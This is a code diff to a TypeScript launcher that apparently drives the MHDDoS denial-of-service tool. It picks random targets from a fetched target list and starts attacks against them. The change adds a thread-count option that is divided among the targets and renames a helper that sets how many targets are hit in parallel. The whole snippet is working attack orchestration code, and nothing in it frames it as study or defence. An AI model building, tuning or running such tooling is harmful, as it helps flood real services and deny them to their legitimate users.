@@ -39,6 +39,7 @@ const {
   'disable-parallel-limit': disableParallelLimit = false,
   'restart-interval': restartInterval = MINUTE * 10,
   debug = true,
+  t = 1000,
   ...mhddosArgs
 } = argv as Argv;
 
@@ -81,7 +82,7 @@ process.on('SIGINT', function () {
 
 async function startAttack(): Promise<void> {
   const targets = await getRandomTargets();
-  const flags = [debug ? '--debug' : undefined, ...mhddosFlags];
+  const flags = [debug ? '--debug' : undefined, `-t=${Math.floor(t / targets.length)}`, ...mhddosFlags];
 
   if (targets.length) {
     console.log(chalk('\nStarting attacks...'));
@@ -116,10 +117,10 @@ async function stopAttack(): Promise<void> {
 
 async function getRandomTargets(): Promise<string[]> {
   const targets = await getTargetList();
-  const goalLength = computeGoalLength(targets);
+  const parallel = computeParallel(targets);
   const randomTargets: string[] = [];
 
-  while (randomTargets.length < goalLength) {
+  while (randomTargets.length < parallel) {
     const randomTarget = targets[Math.floor(Math.random() * targets.length)];
 
     if (!randomTargets.includes(randomTarget) || randomTargets.length >= targets.length) {
@@ -153,7 +154,7 @@ function parseFlags(args: Record<string, any>): Array<ShortArg | LongArg> {
   });
 }
 
-function computeGoalLength(targets: string[]): number {
+function computeParallel(targets: string[]): number {
   if (parallel === 'all') {
     return targets.length;
   }
